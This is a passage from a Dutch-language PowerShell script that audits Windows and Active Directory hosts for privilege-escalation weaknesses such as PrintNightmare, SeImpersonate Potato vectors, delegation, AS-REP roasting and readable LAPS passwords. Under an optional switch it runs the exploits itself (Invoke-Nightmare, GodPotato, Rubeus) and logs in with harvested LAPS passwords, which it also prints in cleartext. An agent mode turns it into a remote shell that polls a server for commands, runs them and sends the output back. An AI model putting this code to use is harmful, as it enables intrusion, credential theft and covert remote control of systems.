                Write-Fail "PrintNightmare patches NIET gevonden (OS build $($osVer.Build).$($osVer.Revision))"
                Write-Host "         → Test: ls \\$env:COMPUTERNAME\pipe\spoolss   # pipe moet bestaan" -ForegroundColor Cyan
                Write-Host "         → Exploit: Import-Module .\CVE-2021-1675.ps1; Invoke-Nightmare -DLL `"C:\path\to\payload.dll`"" -ForegroundColor Cyan
                if ($Become) {
                    Add-BecomeExploit -Priority 8 -Type local -Description "PrintNightmare (CVE-2021-1675)" `
                        -CommandText "Import-Module .\CVE-2021-1675.ps1; Invoke-Nightmare -DLL 'C:\path\to\payload.dll'" `
                        -Command { Import-Module .\CVE-2021-1675.ps1; Invoke-Nightmare }
                }
            }
        } else {
            Write-Pass "Print Spooler niet actief"
        }
    } catch {
        Write-Skip "Kan Spooler niet controleren: $_"
    }

    # 9.12 Potato Attack Vector
    Write-SubSection "Potato Attack Vector"
    try {
        $privOut = whoami.exe /priv 2>$null
        $hasImpersonate = $privOut | Select-String 'SeImpersonatePrivilege'
        $hasAssign = $privOut | Select-String 'SeAssignPrimaryTokenPrivilege'
        if ($hasImpersonate -or $hasAssign) {
            $pipesList = [System.IO.Directory]::GetFiles('\\.\pipe\') 2>$null
            if ($pipesList -match 'spoolss|efsrpc') {
                Write-Fail "Potato aanval mogelijk: SeImpersonate + exploiteerbare pipe"
                Write-Host "         → .\GodPotato.exe -cmd `"cmd /c whoami`"   # GodPotato werkt op Server 2012-2022" -ForegroundColor Cyan
                Write-Host "         → .\PrintSpoofer64.exe -i -c cmd   # als spoolss pipe aanwezig" -ForegroundColor Cyan
                Write-Host "         → .\SweetPotato.exe -p C:\Windows\System32\cmd.exe -a `"/c whoami`"" -ForegroundColor Cyan
                if ($Become) {
                    Add-BecomeExploit -Priority 1 -Type local -Description "Potato: SeImpersonate + exploiteerbare pipe" `
                        -CommandText ".\GodPotato.exe -cmd 'cmd /c whoami'" `
                        -Command { & .\GodPotato.exe -cmd "cmd /c cmd.exe" }
                }
            } else {
                Write-Warn "SeImpersonate aanwezig - potato mogelijk met custom pipe"
            }
        } else {
            Write-Pass "Geen SeImpersonate - potato niet bruikbaar"
        }
    } catch {
        Write-Skip "Kan potato vector niet controleren: $_"
    }

    # --- AD Privesc Checks (LOLBin: via DirectorySearcher / New-LdapSearcher) ---
    if ($IncludeAD) {
        Write-SubSection "Active Directory Privilege Escalatie"

        # Zorg dat baseDN beschikbaar is
        if (-not $baseDN) {
            try {
                $rootDSE = New-Object System.DirectoryServices.DirectoryEntry("LDAP://RootDSE")
                $baseDN  = $rootDSE.Properties["defaultNamingContext"][0]
            } catch {
                Write-Skip "Kan geen LDAP verbinding maken: $_"
            }
        }

        if ($baseDN) {

            # 9.AD1 RBCD
            try {
                $s = New-LdapSearcher -SearchRoot "LDAP://$baseDN" `
                    -Filter "(msDS-AllowedToActOnBehalfOfOtherIdentity=*)" `
                    -Properties @("cn") `
                    -TimeoutSeconds 15
                $results = $s.FindAll()
                if ($results.Count -gt 0) {
                    Write-Warn "RBCD configuratie gevonden:"
                    foreach ($r in $results) { Write-Host "         $($r.Properties['cn'][0])" -ForegroundColor DarkGray }
                } else {
                    Write-Pass "Geen RBCD configuratie"
                }
                $results.Dispose()
            } catch {
                Write-Skip "Kan RBCD niet controleren: $_"
            }

            # 9.AD2 Constrained Delegation
            try {
                $s = New-LdapSearcher -SearchRoot "LDAP://$baseDN" `
                    -Filter "(msDS-AllowedToDelegateTo=*)" `
                    -Properties @("cn", "msDS-AllowedToDelegateTo") `
                    -TimeoutSeconds 15
                $results = $s.FindAll()
                if ($results.Count -gt 0) {
                    Write-Warn "Constrained delegation:"
                    foreach ($r in $results) {
                        $cn = $r.Properties['cn'][0]
                        $targets = $r.Properties['msds-allowedtodelegateto'] -join ', '
                        Write-Host "         $cn -> $targets" -ForegroundColor DarkGray
                    }
                } else {
                    Write-Pass "Geen constrained delegation"
                }
                $results.Dispose()
            } catch {
                Write-Skip "Kan constrained delegation niet controleren: $_"
            }

            # 9.AD3 Unconstrained Delegation (niet-DC)
            try {
                $s = New-LdapSearcher -SearchRoot "LDAP://$baseDN" `
                    -Filter "(&(userAccountControl:1.2.840.113556.1.4.803:=524288)(!(primaryGroupID=516)))" `
                    -Properties @("cn") `
                    -TimeoutSeconds 15
                $results = $s.FindAll()
                if ($results.Count -gt 0) {
                    Write-Warn "Unconstrained delegation (niet-DC):"
                    foreach ($r in $results) { Write-Host "         $($r.Properties['cn'][0])" -ForegroundColor DarkGray }
                } else {
                    Write-Pass "Geen unconstrained delegation op niet-DC"
                }
                $results.Dispose()
            } catch {
                Write-Skip "Kan unconstrained delegation niet controleren: $_"
            }

            # 9.AD4 Pre-Windows 2000 groep
            try {
                $s = New-LdapSearcher -SearchRoot "LDAP://$baseDN" `
                    -Filter "(&(objectClass=group)(cn=Pre-Windows 2000 Compatible Access))" `
                    -Properties @("member") `
                    -TimeoutSeconds 15
                $result = $s.FindOne()
                if ($result -and $result.Properties['member'].Count -gt 0) {
                    $nonDefault = $result.Properties['member'] | Where-Object { $_ -notmatch 'Authenticated Users' }
                    if ($nonDefault) {
                        Write-Warn "Niet-standaard leden Pre-Windows 2000:"
                        $nonDefault | ForEach-Object { Write-Host "         $_" -ForegroundColor DarkGray }
                    } else {
                        Write-Pass "Pre-Windows 2000 alleen standaard leden"
                    }
                } else {
                    Write-Pass "Pre-Windows 2000 groep leeg"
                }
            } catch {
                Write-Skip "Kan Pre-Windows 2000 niet controleren: $_"
            }

            # 9.AD5 AS-REP Roastable
            try {
                $s = New-LdapSearcher -SearchRoot "LDAP://$baseDN" `
                    -Filter "(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))" `
                    -Properties @("cn", "sAMAccountName") `
                    -TimeoutSeconds 15
                $results = $s.FindAll()
                if ($results.Count -gt 0) {
                    Write-Fail "AS-REP Roastable accounts:"
                    foreach ($r in $results) { Write-Host "         $($r.Properties['samaccountname'][0])" -ForegroundColor DarkGray }
                    Write-Host "         → .\Rubeus.exe asreproast /format:hashcat /outfile:asrep.txt" -ForegroundColor Cyan
                    Write-Host "         → hashcat -m 18200 asrep.txt wordlist.txt" -ForegroundColor Cyan
                    if ($Become) {
                        Add-BecomeExploit -Priority 13 -Type ad -Description "AS-REP Roastable accounts" `
                            -CommandText ".\Rubeus.exe asreproast /format:hashcat /outfile:asrep.txt" `
                            -Command { & .\Rubeus.exe asreproast /format:hashcat /outfile:asrep.txt }
                    }
                } else {
                    Write-Pass "Geen AS-REP Roastable accounts"
                }
                $results.Dispose()
            } catch {
                Write-Skip "Kan AS-REP niet controleren: $_"
            }

            # 9.AD6 LAPS leesbaar
            try {
                $s = New-LdapSearcher -SearchRoot "LDAP://$baseDN" `
                    -Filter "(ms-Mcs-AdmPwd=*)" `
                    -Properties @("cn", "ms-Mcs-AdmPwd") `
                    -TimeoutSeconds 15
                $results = $s.FindAll()
                if ($results.Count -gt 0) {
                    Write-Fail "LAPS wachtwoorden leesbaar:"
                    foreach ($r in $results) {
                        $cn = $r.Properties['cn'][0]
                        $pw = $r.Properties['ms-mcs-admpwd'][0]
                        Write-Host "         $cn : $pw" -ForegroundColor DarkGray
                    }
                    Write-Host "         → Gebruik: Enter-PSSession -ComputerName <host> -Credential (New-Object PSCredential('Administrator',(ConvertTo-SecureString '<LAPS_pass>' -AsPlainText -Force)))" -ForegroundColor Cyan
                    Write-Host "         → Of: net use \\<host>\C$ /user:Administrator <LAPS_pass>" -ForegroundColor Cyan
                    if ($Become) {
                        $firstCn = $results[0].Properties['cn'][0]
                        $firstPw = $results[0].Properties['ms-mcs-admpwd'][0]
                        Add-BecomeExploit -Priority 12 -Type ad -Description "LAPS wachtwoord: $firstCn" `
                            -CommandText "Enter-PSSession -ComputerName $firstCn -Credential (New-Object PSCredential('Administrator',(ConvertTo-SecureString '$firstPw' -AsPlainText -Force)))" `
                            -Command ([scriptblock]::Create("Enter-PSSession -ComputerName '$firstCn' -Credential (New-Object PSCredential('Administrator',(ConvertTo-SecureString '$firstPw' -AsPlainText -Force)))"))
                    }
                } else {
                    Write-Pass "LAPS niet leesbaar of niet geconfigureerd"
                }
                $results.Dispose()
            } catch {
                Write-Skip "Kan LAPS niet controleren: $_"
            }

        } # einde baseDN beschikbaar (privesc AD)
    } # einde IncludeAD (privesc)

} # einde IncludePrivesc

# ═════════════════════════════════════════════════════════════════
# RAPPORT
# ═════════════════════════════════════════════════════════════════

Write-Host ""
Write-Host "  === RESULTAAT ===" -ForegroundColor White -BackgroundColor DarkBlue
Write-Host ""

$total = $Script:PassCount + $Script:FailCount + $Script:WarnCount + $Script:SkipCount

Write-Host "  PASS: $($Script:PassCount)" -ForegroundColor Green
Write-Host "  FAIL: $($Script:FailCount)" -ForegroundColor Red
Write-Host "  WARN: $($Script:WarnCount)" -ForegroundColor Yellow
Write-Host "  INFO: $($Script:InfoCount)" -ForegroundColor Cyan
Write-Host "  SKIP: $($Script:SkipCount)" -ForegroundColor DarkGray
Write-Host "  ─────────────"
Write-Host "  TOTAAL: $total checks (+ $($Script:InfoCount) informatief)"
Write-Host ""

if ($Become) { Invoke-Become }

# ── AGENT: remote shell modus ────────────────────────────────
function Start-AgentLoop {
    param([string]$Url)
    $hostname = $env:COMPUTERNAME
    $username = $env:USERNAME
    $osInfo = (Get-CimInstance Win32_OperatingSystem).Caption
    $scriptType = "ps-lolbin"

    $body = @{hostname=$hostname; username=$username; os_info=$osInfo; script=$scriptType} | ConvertTo-Json
    try {
        $resp = Invoke-RestMethod -Uri "$Url/agent/checkin" -Method Post -Body $body -ContentType 'application/json'
    } catch {
        Write-Host "  [AGENT] Checkin gefaald: $_" -ForegroundColor Red
        return
    }
    $agentId = $resp.agent_id
    $freq = if ($resp.freq) { $resp.freq } else { 3 }

    Write-Host "  [AGENT] Geregistreerd als $agentId bij $Url" -ForegroundColor Green
    Write-Host "  [AGENT] Polling elke ${freq}s - Ctrl+C om te stoppen" -ForegroundColor Yellow

    while ($true) {
        try {
            $cmdResp = Invoke-WebRequest -Uri "$Url/agent/cmd/$agentId" -UseBasicParsing -ErrorAction Stop
            if ($cmdResp.StatusCode -eq 200) {
                $cmdData = $cmdResp.Content | ConvertFrom-Json
                $cmdId = $cmdData.id
                $command = $cmdData.command
                Write-Host "  [AGENT] Uitvoeren: $command" -ForegroundColor Cyan
                try {
                    $output = & ([scriptblock]::Create($command)) 2>&1 | Out-String
                } catch {
                    $output = $_.Exception.Message
                }
                Invoke-RestMethod -Uri "$Url/agent/res/$cmdId" -Method Post -Body $output -ContentType 'text/plain' | Out-Null
            }
        } catch {
            # 204 = geen commando, gewoon doorgaan
        }
        Start-Sleep -Seconds $freq
    }
}

if ($Agent) { Start-AgentLoop -Url $Agent }

if ($Script:FailCount -gt 0) {
    Write-Host "  $($Script:FailCount) aanbeveling(en) niet geimplementeerd." -ForegroundColor Red
    exit 1
} elseif ($Script:WarnCount -gt 0) {
    Write-Host "  Alle kritieke checks geslaagd, $($Script:WarnCount) waarschuwing(en)." -ForegroundColor Yellow
    exit 2
} else {
    Write-Host "  Alle checks geslaagd." -ForegroundColor Green
    exit 0
}
